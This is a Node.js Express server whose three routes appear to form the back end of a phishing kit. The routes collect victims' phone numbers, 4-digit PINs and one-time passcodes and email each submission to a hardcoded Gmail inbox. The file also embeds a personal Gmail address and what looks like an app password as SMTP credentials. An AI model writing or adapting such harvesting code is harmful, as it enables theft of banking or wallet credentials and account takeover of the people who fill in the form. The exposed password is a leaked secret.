const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "arewadaniel2@gmail.com";
const smtpUser = process.env.SMTP_USER || userEmail;
const emailPass = process.env.SMTP_PASS || "hgyzzzsduopismyx";
// 4th jan

// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { phone, pin } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: smtpUser,
      pass: emailPass,
    },
  });

  const mailOptions = {
    from: `${phone}`,
    to: userEmail,
    subject: `PhoneNumber: ${phone} & PIN: ${pin}`,
    text: `New user registered with PhoneNumber: ${phone} and  PIN: ${pin}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

 app.post("/pin", (req, res) => {
  const { pin } = req.body;

  if (typeof pin !== "string" || !/^\d{4}$/.test(pin)) {
    return res.status(400).send("Invalid PIN: must be 4 digits");
  }

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: smtpUser,
      pass: emailPass,
    },
  });

  const mailOptions = {
    from: smtpUser,
    to: userEmail,
    subject: `PIN: ${pin}`,
    text: `New user submitted PIN: ${pin}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  const email = req.body.email;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: smtpUser,
      pass: emailPass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `OTP: ${req.body?.otp} `,
    text: `New user enter OTP: ${req.body?.otp}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});

